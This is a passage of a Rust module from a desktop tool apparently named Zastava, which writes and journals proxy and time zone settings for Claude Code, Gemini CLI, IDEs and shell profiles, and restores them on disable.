//! CLI / IDE protection orchestration: enable (Claude Code, Gemini CLI, shell profiles, PowerShell
//! profiles, IDE settings), disable, and status detection.
//!
//! Two independent things are written, each with its own condition and its own journal records:
//! * the **proxy** keys (`HTTP_PROXY`, `HTTPS_PROXY`, `ALL_PROXY`, `NO_PROXY`; `http.proxy` of the
//!   editors) while the CLI / IDE protection is on;
//! * the **time zone / locale** keys (`TZ`, `LANG`, `LC_TIME`; never `LC_ALL`) while the
//!   independent time zone switch is on and a zone is known.
//!
//! Where they go depends on the CLI mode: `ai_only` (default) writes only the settings of Claude
//! Code, Gemini CLI and the editors; `global_terminal` also puts a marked block into the
//! interactive shell profiles (`~/.zshrc`, `~/.bash_profile`; on Windows the PowerShell profile).
//! `~/.zshenv` is never written: a block an old build put there is cut out by its exact markers.
//!
//! Every file is reached through the context ([`FileCtx`]: file system, home, editor roots) and
//! every change goes through the ownership journal: the key (or the marked block) is recorded
//! with what was there before, edited in place, and put back only if it still holds what Zastava
//! wrote. Files that are damaged, ambiguous or not UTF-8 are left alone.

use super::ai_cli::{AGENT_ENV_KEY, apply_agent_settings};
#[cfg(target_os = "windows")]
use super::cleanup::is_zastava_env_signature;
use super::cleanup::is_zastava_proxy_json;
use super::fs::{Fs, WriteMode};
use super::ide::{
    IDE_ENV_KEYS, PROXY_VARS, TZ_VARS_REMOVABLE, apply_ide_settings, ide_candidates, ide_env_key,
    json_str,
};
use super::journal::{Journal, Outcome, RecoveryReport, ReportItem, Resource, Value};
use super::jsonc;
use super::platform::Platform;
use super::shell_rc::{
    SAFE_LOCALE, build_powershell_block, build_shell_block, find_block, is_generated_block,
    normalize_proxy_url_and_port, remove_block, sanitize_timezone,
};
use super::{
    CliProtectionReport, FileCtx, KNOWN_NO_PROXY_VALUES, NO_PROXY_VALUE, Run, SysState,
    journal_failure_text, state, with_files, with_journal,
};
use crate::state::CliMode;
use std::path::{Path, PathBuf};

/// Marker of the finished one-time cleanup of settings files that builds without a journal
/// (1.3.x, 2.0) left behind.
const LEGACY_FILES_MARK: &str = "legacy-2.0-files-cleanup";

/// Marker of the finished one-time cleanup of the marked blocks 2.0.0 left in shell profiles
/// (and in `~/.zshenv`). Separate from [`LEGACY_FILES_MARK`], which early 2.1 builds may already
/// have set.
const LEGACY_SHELL_MARK: &str = "legacy-2.0-shell-blocks-cleanup";

/// The interactive profiles Zastava may WRITE its block into (only in `global_terminal`).
const SHELL_WRITE_FILES: [&str; 2] = [".zshrc", ".bash_profile"];

/// The profile Zastava no longer writes into. Only ever CLEANED: an old marked block is cut out by
/// its exact markers (every `zsh` subshell of `brew` / `npm` runs `~/.zshenv`, and the block's
/// `nc -z` probe made hundreds of calls).
const ZSHENV: &str = ".zshenv";

/// Where shell profiles live on the host: the choice is a value, so the profile logic can be
/// exercised for both systems on one machine.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(super) enum HostOs {
    Unix,
    Windows,
}

impl HostOs {
    pub(super) fn current() -> Self {
        if cfg!(windows) {
            HostOs::Windows
        } else {
            HostOs::Unix
        }
    }
}

/// What the files should look like: the proxy part, the time zone part, the mode.
pub(super) struct FilePlan<'a> {
    /// `Some(url)`: the CLI / IDE protection is on and the proxy keys are written.
    pub proxy_url: Option<&'a str>,
    /// Gateway port for the `nc -z` / listener probe of a shell block.
    pub port: u16,
    /// `Some(zone)`: the time zone switch is on and a zone is known.
    pub tz: Option<&'a str>,
    pub mode: CliMode,
    pub os: HostOs,
    /// Explicit switch to `ai_only`: also cut out unjournaled blocks of 2.0.0 by their markers.
    pub strip_unjournaled_blocks: bool,
}

/// What [`apply_files`] did: display names of what is set up, notes for the user (no values) and
/// the outcome of everything it gave back.
#[derive(Default)]
pub(super) struct FilesApplied {
    pub targets: Vec<String>,
    pub notes: Vec<String>,
    pub report: RecoveryReport,
}

fn read_utf8(fs: &dyn Fs, file: &Path) -> Result<Option<String>, &'static str> {
    match fs.read(file) {
        Ok(None) => Ok(None),
        Ok(Some(b)) => String::from_utf8(b)
            .map(Some)
            .map_err(|_| "profile is not UTF-8"),
        Err(_) => Err("profile cannot be read"),
    }
}

fn text_block_res(file: &Path) -> Resource {
    Resource::TextBlock {
        file: file.to_string_lossy().into_owned(),
    }
}

/// Puts the Zastava block into a shell / PowerShell profile through the journal. Refused (nothing
/// written) when the markers are partial or repeated, when the file is not UTF-8, or when an
/// existing block is not one Zastava wrote and the journal has no record of it (the user's own
/// edit). A block left by a build without a journal is migrated: it is removed and replaced
/// (this is also where the dangerous old PowerShell `else` branch goes).
fn apply_profile_block(
    j: &mut Journal,
    p: &dyn Platform,
    fs: &dyn Fs,
    file: &Path,
    block: &str,
) -> Result<(), String> {
    let name = file.to_string_lossy().into_owned();
    let res = Resource::TextBlock { file: name.clone() };
    let text = read_utf8(fs, file)?;
    if let Some(t) = &text {
        let found = find_block(t).map_err(|_| "profile markers are ambiguous")?;
        if let Some(r) = found
            && j.entry(&res).is_none()
        {
            if !is_generated_block(&t[r]) {
                return Err("the block in the profile was edited by the user".to_string());
            }
            let cleaned = remove_block(t).map_err(|_| "profile markers are ambiguous")?;
            fs.write_atomic(file, cleaned.as_bytes(), WriteMode::KeepExisting)
                .map_err(|_| "profile cannot be written")?;
        }
    } else {
        let bare = Resource::File {
            file: name,
            skeleton: String::new(),
        };
        j.apply(p, &bare, Value::Present(true))
            .map_err(|e| e.to_string())?;
    }
    j.apply(p, &res, Value::Block(Some(block.to_string())))
        .map_err(|e| e.to_string())?;
    Ok(())
}

/// Gives back what the journal recorded for one profile: the block, then the file when Zastava
/// created it and it is still bare.
fn restore_profile(j: &mut Journal, p: &dyn Platform, file: &Path) -> Vec<ReportItem> {
    let mut items = Vec::new();
    let block = text_block_res(file);
    if j.entry(&block).is_some() {
        items.extend(j.restore_one(p, &block));
    }
    let bare = j
        .entries()
        .iter()
        .find(|e| {
            matches!(&e.resource, Resource::File { file: f, .. }
                if *f == file.to_string_lossy().as_ref())
        })
        .map(|e| e.resource.clone());
    if let Some(bare) = bare {
        items.extend(j.restore_one(p, &bare));
    }
    items
}

/// What cutting a block out of a profile by its exact markers came to.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(super) enum Strip {
    /// No block (or no file).
    Absent,
    /// The block was cut out; the bytes around it are unchanged.
    Removed,
    /// The journal records this block: it is given back through the journal, not here.
    Journaled,
    /// A marker without its partner (or repeated / not on its own line): not changed.
    Partial,
    /// Between the markers there is something Zastava does not write: not changed.
    Edited,
    /// The file could not be read (or is not UTF-8): not changed.
    Unreadable,
    /// The file could not be written.
    WriteFailed,
}

impl Strip {
    /// Fully dealt with: nothing is left that a later pass would have to do.
    fn is_clean(self) -> bool {
        matches!(self, Strip::Absent | Strip::Removed | Strip::Journaled)
    }

    /// Russian note for the user (names a profile, never a value). `None` when nothing to say.
    pub(super) fn note(self, label: &str) -> Option<String> {
        match self {
            Strip::Partial => Some(format!(
                "обнаружен незавершённый блок Заставы в {label} — не изменён"
            )),
            Strip::Edited => Some(format!(
                "блок Заставы в {label} изменён пользователем — не тронут"
            )),
            Strip::Unreadable => Some(format!("{label} не удалось прочитать — не изменён")),
            Strip::WriteFailed => Some(format!("не удалось убрать блок Заставы из {label}")),
            Strip::Absent | Strip::Removed | Strip::Journaled => None,
        }
    }
}

/// Cuts the Zastava block out of `file` strictly by its exact markers (the bytes before and after
/// it stay as they are), but only when no journal record covers it and every line of the block is
/// one a Zastava build writes. Partial markers and blocks with foreign lines are reported, never
/// changed.
fn strip_marked_block(j: &Journal, fs: &dyn Fs, file: &Path) -> Strip {
    if j.entry(&text_block_res(file)).is_some() {
        return Strip::Journaled;
    }
    let text = match read_utf8(fs, file) {
        Ok(Some(t)) => t,
        Ok(None) => return Strip::Absent,
        Err(_) => return Strip::Unreadable,
    };
    let range = match find_block(&text) {
        Ok(Some(r)) => r,
        Ok(None) => return Strip::Absent,
        Err(_) => return Strip::Partial,
    };
    if !is_generated_block(&text[range]) {
        return Strip::Edited;
    }
    match remove_block(&text) {
        Ok(cleaned) => {
            if fs
                .write_atomic(file, cleaned.as_bytes(), WriteMode::KeepExisting)
                .is_ok()
            {
                Strip::Removed
            } else {
                Strip::WriteFailed
            }
        }
        Err(_) => Strip::Partial,
    }
}

/// Home-relative display name of a profile, e.g. `~/.zshrc` (fixed names, no user data).
fn home_label(ctx: &FileCtx, file: &Path) -> String {
    let rel = file.strip_prefix(&ctx.home).unwrap_or(file);
    let parts: Vec<_> = rel.iter().map(|c| c.to_string_lossy()).collect();
    format!("~/{}", parts.join("/"))
}

fn strip_report_item(file: &Path, s: Strip) -> ReportItem {
    ReportItem {
        resource: format!(
            "legacy:profile:{}",
            file.file_name()
                .map(|n| n.to_string_lossy())
                .unwrap_or_default()
        ),
        outcome: match s {
            Strip::Removed => Outcome::Restored,
            Strip::Absent | Strip::Journaled => Outcome::AlreadyRestored,
            // Left as it is, and said so: not a failure, the user decides.
            Strip::Partial | Strip::Edited | Strip::Unreadable => Outcome::ExternalChange,
            Strip::WriteFailed => Outcome::Failed("profile_write"),
        },
    }
}

/// `~/.zshenv`: gives back what the journal recorded for it (an early 2.1 build wrote there) and
/// cuts out an old block by its exact markers. Run at start, on every enable / disable and in
/// `--cleanup`: cheap, and byte-exact for everything around the block.
pub(super) fn clean_zshenv(
    j: &mut Journal,
    p: &dyn Platform,
    ctx: &FileCtx,
) -> (Strip, Vec<ReportItem>) {
    let file = ctx.home.join(ZSHENV);
    let mut items = restore_profile(j, p, &file);
    let s = strip_marked_block(j, &*ctx.fs, &file);
    items.push(strip_report_item(&file, s));
    (s, items)
}

/// Removes the keys a build without a journal left in one settings file: only values that carry
/// the Zastava signature (or are exactly what Zastava writes), and only keys the journal does not
/// know. Returns `false` when the file could not be examined or written.
fn clean_legacy_json(
    j: &Journal,
    fs: &dyn Fs,
    file: &Path,
    root: bool,
    containers: &[&str],
    gateway_port: Option<u16>,
) -> bool {
    let name = file.to_string_lossy().into_owned();
    let text = match fs.read(file) {
        Ok(None) => return true,
        Ok(Some(b)) => match String::from_utf8(b) {
            Ok(t) => t,
            Err(_) => return false,
        },
        Err(_) => return false,
    };
    if jsonc::is_blank(&text) {
        return true;
    }
    let known = |path: &[&str]| {
        j.entry(&Resource::JsonKey {
            file: name.clone(),
            path: path.iter().map(|s| s.to_string()).collect(),
        })
        .is_some()
    };
    let signed_val = |raw: &str| is_zastava_proxy_json(raw, gateway_port);
    let run = || -> Result<String, jsonc::JsoncError> {
        let mut cur = text.clone();
        if root {
            let sig = |t: &str, k: &str| -> Result<bool, jsonc::JsoncError> {
                Ok(jsonc::get(t, &[k])?.is_some_and(|f| signed_val(f.raw)))
            };
            if !known(&["http.proxy"]) && sig(&cur, "http.proxy")? {
                cur = jsonc::remove(&cur, &["http.proxy"])?;
                let support = jsonc::get(&cur, &["http.proxySupport"])?
                    .is_some_and(|f| f.raw == "\"override\"");
                if support && !known(&["http.proxySupport"]) {
                    cur = jsonc::remove(&cur, &["http.proxySupport"])?;
                }
            }
        }
        for c in containers {
            // The co-signature: one of the proxy variables points at our gateway.
            let signed =
                ["HTTPS_PROXY", "HTTP_PROXY", "ALL_PROXY"]
                    .iter()
                    .try_fold(false, |acc, k| {
                        Ok::<_, jsonc::JsoncError>(
                            acc || (!known(&[c, k])
                                && jsonc::get(&cur, &[c, k])?.is_some_and(|f| signed_val(f.raw))),
                        )
                    })?;
            if !signed {
                continue;
            }
            for var in PROXY_VARS.iter().chain(TZ_VARS_REMOVABLE.iter()) {
                if known(&[c, var]) {
                    continue;
                }
                let Some(f) = jsonc::get(&cur, &[c, var])? else {
                    continue;
                };
                let ours = match *var {
                    "NO_PROXY" => KNOWN_NO_PROXY_VALUES.iter().any(|v| f.raw == json_str(v)),
                    // The zone only next to a signed proxy variable (checked above).
                    "TZ" => serde_json::from_str::<String>(f.raw)
                        .ok()
                        .is_some_and(|v| sanitize_timezone(&v).as_deref() == Some(v.as_str())),
                    // A locale only with the exact value Zastava wrote.
                    "LANG" | "LC_TIME" | "LC_ALL" => f.raw == json_str(SAFE_LOCALE),
                    _ => signed_val(f.raw),
                };
                if ours {
                    cur = jsonc::remove(&cur, &[c, var])?;
                }
            }
            if jsonc::get(&cur, &[c])?.is_some_and(|f| f.is_empty_object) {
                cur = jsonc::remove(&cur, &[c])?;
            }
        }
        Ok(cur)
    };
    match run() {
        Ok(new) if new == text => true,
        Ok(new) => fs
            .write_atomic(file, new.as_bytes(), WriteMode::KeepExisting)
            .is_ok(),
        Err(_) => false,
    }
}

/// Every profile a Zastava block may be in (for cleaning and status): the shell profiles
/// including `~/.zshenv`, and the PowerShell profiles.
fn profile_files(ctx: &FileCtx) -> Vec<PathBuf> {
    let mut files: Vec<_> = std::iter::once(ZSHENV)
        .chain(SHELL_WRITE_FILES)
        .map(|n| ctx.home.join(n))
        .collect();
    files.extend(ctx.powershell_profiles());
    files
}

/// The profiles Zastava writes its block into on `os`, in `global_terminal`.
fn write_profiles(ctx: &FileCtx, os: HostOs) -> Vec<PathBuf> {
    match os {
        HostOs::Unix => SHELL_WRITE_FILES.iter().map(|n| ctx.home.join(n)).collect(),
        HostOs::Windows => ctx.powershell_profiles(),
    }
}

/// One-time cleanup of what builds without a journal left (see [`LEGACY_FILES_MARK`],
/// [`LEGACY_SHELL_MARK`]):
/// * `~/.zshenv`: the old block is cut out by its markers (also on every later call, see
///   [`clean_zshenv`]);
/// * in `ai_only` the 2.0.0 blocks of `~/.zshrc`, `~/.bash_profile` and the PowerShell profiles
///   are cut out too, only when made of lines Zastava writes (in `global_terminal` the block is
///   replaced when the new one is written);
/// * the keys in `settings.json` files that carry the Zastava signature.
///
/// Returns the notes for the user.
fn migrate_legacy_files(
    j: &mut Journal,
    p: &dyn Platform,
    ctx: &FileCtx,
    mode: CliMode,
) -> Vec<String> {
    let fs = &*ctx.fs;
    let mut notes = Vec::new();
    let (z, _) = clean_zshenv(j, p, ctx);
    notes.extend(z.note("~/.zshenv"));
    if !j.has_mark(LEGACY_SHELL_MARK) {
        let mut clean = z.is_clean();
        if mode == CliMode::AiOnly {
            for file in profile_files(ctx)
                .into_iter()
                .filter(|f| !f.ends_with(ZSHENV))
            {
                let s = strip_marked_block(j, fs, &file);
                clean &= s.is_clean();
                notes.extend(s.note(&home_label(ctx, &file)));
            }
        }
        // A block the user edited or a half marker is reported again at the next start; the
        // mark means "everything was examined and nothing is left to do".
        if clean && mode == CliMode::AiOnly {
            let _ = j.set_mark(p, LEGACY_SHELL_MARK);
        }
    }
    if j.has_mark(LEGACY_FILES_MARK) {
        return notes;
    }
    let gw = state().gateway_port();
    let mut complete =
        clean_legacy_json(j, fs, &ctx.claude_settings(), false, &[AGENT_ENV_KEY], gw);
    complete &= clean_legacy_json(j, fs, &ctx.gemini_settings(), false, &[AGENT_ENV_KEY], gw);
    for (_, file) in ide_candidates(ctx) {
        complete &= clean_legacy_json(j, fs, &file, true, &IDE_ENV_KEYS, gw);
    }
    if complete {
        let _ = j.set_mark(p, LEGACY_FILES_MARK);
    }
    notes
}

/// Writes (or gives back) the CLI / IDE side to match `plan`. Every target is independent: a file
/// that cannot be edited safely is skipped (and named in the log, without values), the others go
/// on.
///
/// * Claude Code, Gemini CLI, editors: proxy keys follow `plan.proxy_url`, time zone keys follow
///   `plan.tz`; a part that is off is given back through the journal.
/// * Shell / PowerShell profiles: only in `global_terminal`; one marked block with the parts that
///   are on, or no block at all. In `ai_only` whatever the journal recorded is given back and
///   nothing is written.
pub(super) fn apply_files(
    j: &mut Journal,
    p: &dyn Platform,
    ctx: &FileCtx,
    plan: &FilePlan<'_>,
) -> FilesApplied {
    let mut out = FilesApplied {
        notes: migrate_legacy_files(j, p, ctx, plan.mode),
        ..Default::default()
    };
    let something = plan.proxy_url.is_some() || plan.tz.is_some();
    let note = |label: &str, r: Result<Vec<ReportItem>, String>, out: &mut FilesApplied| match r {
        Ok(items) => {
            out.report.items.extend(items);
            if something {
                out.targets.push(label.to_string());
            }
        }
        Err(e) => eprintln!("Застава: {label} пропущен: {e}"),
    };

    // 1. Claude Code settings (~/.claude/settings.json)
    let r = apply_agent_settings(j, p, ctx, &ctx.claude_settings(), plan.proxy_url, plan.tz);
    note("Claude Code", r, &mut out);

    // 2. Gemini CLI / Antigravity settings (~/.gemini/settings.json if the directory exists)
    let gemini_present = ctx.fs.exists(&ctx.home.join(".gemini"));
    let (g_proxy, g_tz) = if gemini_present {
        (plan.proxy_url, plan.tz)
    } else {
        (None, None) // nothing to write: only what the journal recorded is given back
    };
    let r = apply_agent_settings(j, p, ctx, &ctx.gemini_settings(), g_proxy, g_tz);
    if gemini_present {
        note("Gemini CLI", r, &mut out);
    } else if let Ok(items) = r {
        out.report.items.extend(items);
    }

    // 3. Shell profiles (~/.zshrc, ~/.bash_profile) or PowerShell profiles, `global_terminal` only.
    // NEVER ~/.zshenv, and NEVER proxy vars or TZ / LANG / LC_TIME into the global
    // HKCU\Environment: the Windows CRT (_tzset) and Qt/Electron cannot parse IANA timezones and
    // fall back to UTC+0. Stale values from old builds are removed only by the signature-based
    // cleanup.
    let block = (plan.mode == CliMode::GlobalTerminal && something).then(|| match plan.os {
        HostOs::Unix => build_shell_block(plan.port, plan.proxy_url, plan.tz),
        HostOs::Windows => build_powershell_block(plan.port, plan.proxy_url, plan.tz),
    });
    let mut configured = false;
    for file in write_profiles(ctx, plan.os) {
        let wanted = match &block {
            // A missing ~/.bash_profile is not created (bash users have it, zsh users do not).
            Some(_) if file.ends_with(".bash_profile") => {
                ctx.fs.exists(&file) || j.entry(&text_block_res(&file)).is_some()
            }
            Some(_) => true,
            None => false,
        };
        match (&block, wanted) {
            (Some(b), true) => match apply_profile_block(j, p, &*ctx.fs, &file, b) {
                Ok(()) => configured = true,
                Err(e) => eprintln!("Застава: профиль терминала пропущен: {e}"),
            },
            _ => {
                out.report.items.extend(restore_profile(j, p, &file));
                if plan.strip_unjournaled_blocks {
                    let s = strip_marked_block(j, &*ctx.fs, &file);
                    out.notes.extend(s.note(&home_label(ctx, &file)));
                    out.report.items.push(strip_report_item(&file, s));
                }
            }
        }
    }
    if configured {
        out.targets.push(match plan.os {
            HostOs::Unix => "Терминал (~/.zshrc)".to_string(),
            HostOs::Windows => "PowerShell ($PROFILE)".to_string(),
        });
    }

    // 4. Installed IDEs (VS Code, Cursor, Windsurf, VSCodium, Antigravity)
    for (label, settings_path) in ide_candidates(ctx) {
        let r = apply_ide_settings(j, p, ctx, &settings_path, plan.proxy_url, plan.tz);
        note(label, r, &mut out);
    }
    out
}

/// Puts back what Zastava changed in the user's files: each key / block only if it still holds
/// what Zastava wrote, files it created only while they are still bare. Everything of both parts
/// (proxy and time zone) goes; `~/.zshenv` is cleaned of an old block as well.
pub(super) fn disable_files(
    j: &mut Journal,
    p: &dyn Platform,
    ctx: Option<&FileCtx>,
    mode: CliMode,
) -> RecoveryReport {
    if let Some(ctx) = ctx {
        migrate_legacy_files(j, p, ctx, mode);
    }
    j.restore_where(p, Resource::is_file_resource)
}

/// Result of [`apply_cli_settings`].
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct CliApplied {
    /// The journal was usable and the settings were applied (always `true` in OS dry-run).
    pub ok: bool,
    /// Display names of what carries the time zone / locale (or the proxy) now.
    pub targets: Vec<String>,
    /// Notes for the user (no values): an old block that could not be removed, etc.
    pub notes: Vec<String>,
    /// Russian text when the journal could not be opened (nothing was changed).
    pub error: Option<String>,
}

fn run_apply(
    what: &str,
    proxy: Option<&(String, u16)>,
    tz: Option<&str>,
    mode: CliMode,
    strip: bool,
) -> Run<FilesApplied> {
    let port = proxy
        .map(|(_, p)| *p)
        .or_else(|| state().gateway_port())
        .unwrap_or(8899);
    let plan = FilePlan {
        proxy_url: proxy.map(|(u, _)| u.as_str()),
        port,
        tz,
        mode,
        os: HostOs::current(),
        strip_unjournaled_blocks: strip,
    };
    with_files(what, |j, p, ctx| apply_files(j, p, ctx, &plan))
}

/// Applies the CLI mode and the time zone to the files, leaving the proxy part as it is (on or
/// off, as the last enable / disable left it). `tz` is the zone to apply, `None` when the time
/// zone switch is off or no zone is known: the zone keys are then given back through the journal.
///
/// This is the one entry point for "the time zone switch was flipped", "a new zone was synced"
/// and "the mode was changed"; it never turns the proxy protection on.
pub fn apply_cli_settings(mode: CliMode, tz: Option<&str>) -> CliApplied {
    let tz = tz.and_then(sanitize_timezone);
    let st = state();
    let proxy = st.cli_proxy();
    // Switching to ai_only: shell blocks that 2.0.0 left (no journal record) go too.
    let strip = mode == CliMode::AiOnly && st.cli_mode() != CliMode::AiOnly;
    let run = run_apply(
        "cli_files:apply",
        proxy.as_ref(),
        tz.as_deref(),
        mode,
        strip,
    );
    finish_apply(st, run, tz, mode)
}

fn finish_apply(
    st: &SysState,
    run: Run<FilesApplied>,
    tz: Option<String>,
    mode: CliMode,
) -> CliApplied {
    let applied = match run {
        Run::Done(a) => a,
        Run::Blocked => FilesApplied::default(),
        Run::Failed(e) => {
            return CliApplied {
                ok: false,
                error: Some(journal_failure_text(&e)),
                ..Default::default()
            };
        }
    };
    st.set_cli_tz(tz);
    st.set_cli_mode(mode);
    CliApplied {
        ok: !applied.report.has_failures(),
        targets: applied.targets,
        notes: applied.notes,
        error: None,
    }
}

/// Automatically configures CLI & IDE protection across:
/// 1. `~/.claude/settings.json` and `~/.gemini/settings.json` (`env.HTTPS_PROXY`, `env.HTTP_PROXY`, ...)
/// 2. VS Code / Cursor / Windsurf `settings.json` (`http.proxy` + `terminal.integrated.env.*`)
/// 3. In `global_terminal` only: shell profiles (`~/.zshrc`, `~/.bash_profile`) with an automatic
///    `nc -z` liveness check
///
/// The time zone / locale keys follow `tz` independently. Neither `launchctl setenv` nor
/// `~/.zshenv` is used. Uses the CLI mode the process remembers.
pub fn enable_cli_and_ide_protection(proxy_addr_or_url: &str) -> CliProtectionReport {
    enable_cli_and_ide_protection_with(proxy_addr_or_url, state().cli_mode(), None)
}

/// Configures CLI & IDE protection in `mode`, with the optional time zone (`TZ`) and safe locale
/// (`LANG`, `LC_TIME`) for the AI tools. `tz` is `None` when the time zone switch is off.
///
/// If the ownership journal cannot be opened (busy, damaged, unknown schema) nothing is written
/// and the report says `enabled: false` with the reason in `error`.
pub fn enable_cli_and_ide_protection_with(
    proxy_addr_or_url: &str,
    mode: CliMode,
    tz: Option<&str>,
) -> CliProtectionReport {
    let (proxy_url, port) = normalize_proxy_url_and_port(proxy_addr_or_url);
    let tz = tz.and_then(sanitize_timezone);
    // Leftovers of 2.0.0 in the user environment are removed by the one-time migration (see
    // `cleanup`); nothing is put into the launchd or Windows user environment.
    let proxy = (proxy_url, port);
    let run = run_apply("cli_files:enable", Some(&proxy), tz.as_deref(), mode, false);
    finish_enable(state(), run, proxy, tz, mode)
}

/// Turns the outcome of the file pass into the report; the runtime state is touched only when the
/// pass actually ran (a refused journal means nothing was written, so nothing is "on").
fn finish_enable(
    st: &SysState,
    run: Run<FilesApplied>,
    proxy: (String, u16),
    tz: Option<String>,
    mode: CliMode,
) -> CliProtectionReport {
    let (proxy_url, port) = proxy;
    let applied = match run {
        Run::Done(a) => a,
        Run::Blocked => FilesApplied::default(),
        Run::Failed(e) => {
            return CliProtectionReport {
                enabled: false,
                proxy_url,
                configured_targets: Vec::new(),
                shell_command: String::new(),
                notes: Vec::new(),
                error: Some(journal_failure_text(&e)),
            };
        }
    };
    st.set_cli_proxy(Some((proxy_url.clone(), port)));
    st.set_cli_tz(tz.clone());
    st.set_cli_mode(mode);
    st.set_cli_protection_active(true);

    let mut shell_command = format!(
        "export HTTP_PROXY=\"{proxy_url}\" HTTPS_PROXY=\"{proxy_url}\" ALL_PROXY=\"{proxy_url}\" NO_PROXY=\"{NO_PROXY_VALUE}\""
    );
    if let Some(zone) = &tz {
        shell_command.push_str(&format!(
            " TZ=\"{zone}\" LANG=\"{SAFE_LOCALE}\" LC_TIME=\"{SAFE_LOCALE}\""
        ));
    }
    CliProtectionReport {
        enabled: true,
        proxy_url,
        configured_targets: applied.targets,
        shell_command,
        notes: applied.notes,
        error: None,
    }
}

/// Puts back the IDE `settings.json`, `~/.claude/settings.json` and `~/.gemini/settings.json`
/// keys Zastava wrote. A user environment recorded in the journal by an earlier build is
/// restored from the journal (see [`disable_cli_protection`]), not guessed here.
pub fn disable_cli_and_ide_runtime_settings() {
    let mode = state().cli_mode();
    let _ = with_files("cli_settings:restore", |j, p, ctx| {
        migrate_legacy_files(j, p, ctx, mode);
        j.restore_where(p, |r| {
            matches!(r, Resource::JsonKey { .. } | Resource::JsonObject { .. })
                || matches!(r, Resource::File { skeleton, .. } if !skeleton.is_empty())
        })
    });
}

/// Switches the CLI / IDE protection off: the proxy keys go back, the user environment Zastava set
/// (a 2.0.0 leftover recorded in the journal) is restored (foreign values stay). The time zone /
/// locale keys stay while the time zone switch is on: it is independent of this one.
///
/// The report says what could not be put back (`has_failures()`); nothing is lost then, the
/// records stay and are finished later. If the journal cannot be opened nothing is changed and the
/// report says `journal_write_failed`.
pub fn disable_cli_protection() -> RecoveryReport {
    let mut report = super::cleanup::restore_user_env();
    let st = state();
    let run = run_apply(
        "cli_files:restore",
        None,
        st.cli_tz().as_deref(),
        st.cli_mode(),
        false,
    );
    finish_disable(st, run, &mut report);
    report
}

fn finish_disable(st: &SysState, run: Run<FilesApplied>, report: &mut RecoveryReport) {
    match run {
        Run::Done(a) => {
            report.items.extend(a.report.items);
            report.journal_write_failed |= a.report.journal_write_failed;
        }
        Run::Blocked => {}
        Run::Failed(_) => {
            // Nothing was changed: the protection is still in the files, so it is still "on".
            report.journal_write_failed = true;
            return;
        }
    }
    st.set_cli_protection_active(false);
    st.set_cli_proxy(None);
}

/// The file side of a complete cleanup (exit, `--cleanup`, the "clean everything" button): IDE /
/// CLI settings, shell profiles, PowerShell profiles; both parts, proxy and time zone. Nothing is
/// changed when the journal cannot be opened.
pub(super) fn disable_cli_files() -> RecoveryReport {
    state().set_cli_protection_active(false);
    state().set_cli_proxy(None);
    state().set_cli_tz(None);
    let mode = state().cli_mode();
    match with_journal("cli_files:restore", |j, p| {
        match FileCtx::real_with_fs(j.fs()) {
            Some(ctx) => disable_files(j, p, Some(&ctx), mode),
            None => disable_files(j, p, None, mode),
        }
    }) {
        Run::Done(r) => r,
        Run::Blocked => RecoveryReport {
            skipped_dry_run: true,
            ..Default::default()
        },
        Run::Failed(_) => RecoveryReport {
            journal_write_failed: true,
            ..Default::default()
        },
    }
}

/// The raw JSON text of `env.<name>` style value in a settings file.
fn json_raw(text: &str, path: &[&str]) -> Option<String> {
    jsonc::get(text, path)
        .ok()
        .flatten()
        .map(|f| f.raw.to_string())
}

/// Whether the files carry Zastava's proxy protection: a marked block with proxy variables in a
/// profile, or the Zastava proxy (strict signature, see `cleanup::is_zastava_env_signature`) in
/// the Claude / Gemini settings.
pub(super) fn files_show_protection(ctx: &FileCtx) -> bool {
    let read = |f: &Path| -> Option<String> {
        ctx.fs
            .read(f)
            .ok()
            .flatten()
            .map(|b| String::from_utf8_lossy(&b).into_owned())
    };
    for rc_path in profile_files(ctx) {
        let Some(content) = read(&rc_path) else {
            continue;
        };
        if let Ok(Some(r)) = find_block(&content)
            && (content[r.clone()].contains("HTTPS_PROXY") || content[r].contains("HTTP_PROXY"))
        {
            return true;
        }
        if content.contains("# >>> ZASTAVA AI GUARD >>>") {
            return true;
        }
    }
    let gw = state().gateway_port();
    for settings in [ctx.claude_settings(), ctx.gemini_settings()] {
        let Some(content) = read(&settings) else {
            continue;
        };
        let content = content.trim_start_matches('\u{feff}');
        for name in ["HTTPS_PROXY", "HTTP_PROXY", "ALL_PROXY"] {
            if json_raw(content, &[AGENT_ENV_KEY, name])
                .is_some_and(|raw| is_zastava_proxy_json(&raw, gw))
            {
                return true;
            }
        }
    }
    false
}

/// Whether the files carry the time zone / safe locale for the AI tools: `LANG` and `LC_TIME`
/// with the safe value in the Claude / Gemini settings, in an editor's integrated terminal
/// environment, or in a shell profile block.
pub(super) fn files_show_tz_sync(ctx: &FileCtx) -> bool {
    let read = |f: &Path| -> Option<String> {
        ctx.fs
            .read(f)
            .ok()
            .flatten()
            .map(|b| String::from_utf8_lossy(&b).into_owned())
    };
    let safe = json_str(SAFE_LOCALE);
    let has_locale = |text: &str, container: &str| {
        let text = text.trim_start_matches('\u{feff}');
        json_raw(text, &[container, "LANG"]).as_deref() == Some(safe.as_str())
            && json_raw(text, &[container, "LC_TIME"]).as_deref() == Some(safe.as_str())
    };
    for settings in [ctx.claude_settings(), ctx.gemini_settings()] {
        if read(&settings).is_some_and(|t| has_locale(&t, AGENT_ENV_KEY)) {
            return true;
        }
    }
    for (_, file) in ide_candidates(ctx) {
        if read(&file).is_some_and(|t| has_locale(&t, ide_env_key())) {
            return true;
        }
    }
    let lang = format!("LANG=\"{SAFE_LOCALE}\"");
    let time = format!("LC_TIME=\"{SAFE_LOCALE}\"");
    for file in profile_files(ctx) {
        if let Some(t) = read(&file)
            && let Ok(Some(r)) = find_block(&t)
            && t[r.clone()].contains(&lang)
            && t[r].contains(&time)
        {
            return true;
        }
    }
    false
}

/// Whether the time zone / locale sync is on in this process and really applied: a zone is being
/// synced and the files carry `LANG` and `LC_TIME` (`LC_ALL` is not required and not exported).
pub fn sync_ai_tz_active() -> bool {
    state().cli_tz().is_some() && FileCtx::real().is_some_and(|ctx| files_show_tz_sync(&ctx))
}

/// Checks whether CLI protection is currently enabled in memory, in shell profiles
/// (`~/.zshrc`, `~/.bash_profile`, a leftover in `~/.zshenv`), Claude/Gemini settings, or the
/// Windows user environment of an older build.
pub fn is_cli_protection_enabled() -> bool {
    if state().cli_protection_active() {
        return true;
    }
    if FileCtx::real().is_some_and(|ctx| files_show_protection(&ctx)) {
        return true;
    }
